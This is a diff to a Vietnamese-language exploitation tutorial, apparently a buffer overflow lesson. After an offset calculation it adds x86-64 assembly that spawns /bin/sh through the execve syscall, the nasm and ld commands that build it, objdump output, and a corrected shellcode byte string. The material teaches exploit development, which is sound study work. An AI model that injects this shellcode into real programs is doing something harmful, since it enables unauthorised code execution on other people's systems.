@@ -42,22 +42,51 @@ Từ các thông tin trên, ta tính được offset là `0x00007fffffffdee8 - 0
 #### Lấy shellcode
 Ở các bài trước, ta có assembly code sau để gọi `/bin/sh`:
 ```asm
+section .text
+global _start
+_start:
+        xor rax,rax
+        push rax
+        mov rbx,'/bin//sh'
+        xor rsi,rsi
+        xor rdx,rdx
+        push rbx
+        push rsp
+        pop rdi
+        mov al,0x3b
+        syscall
+```
+
+Compile đoạn code assembly.
+```bash
+nasm -f elf64 shellcode.asm -o shellcode.o
+ld shellcode.o -o shellcode
+```
+
+Dùng `objdump` để xem shellcode của file object vừa compile:
+```bash
+└─$ objdump -d shellcode.o      
+
+shellcode.o:     file format elf64-x86-64
+
+
 Disassembly of section .text:
 
 0000000000000000 <_start>:
-   0:   50                      push   %rax
-   1:   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
-   8:   2f 73 68 
-   b:   48 31 f6                xor    %rsi,%rsi
-   e:   48 31 d2                xor    %rdx,%rdx
-  11:   53                      push   %rbx
-  12:   54                      push   %rsp
-  13:   5f                      pop    %rdi
-  14:   b0 3b                   mov    $0x3b,%al
-  16:   0f 05                   syscall 
+   0:   48 31 c0                xor    %rax,%rax
+   3:   50                      push   %rax
+   4:   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
+   b:   2f 73 68 
+   e:   48 31 f6                xor    %rsi,%rsi
+  11:   48 31 d2                xor    %rdx,%rdx
+  14:   53                      push   %rbx
+  15:   54                      push   %rsp
+  16:   5f                      pop    %rdi
+  17:   b0 3b                   mov    $0x3b,%al
+  19:   0f 05                   syscall
 ```
 
 Với đoạn code assembly này, ta có shellcode là:
 ```
-\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
+\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
 ```
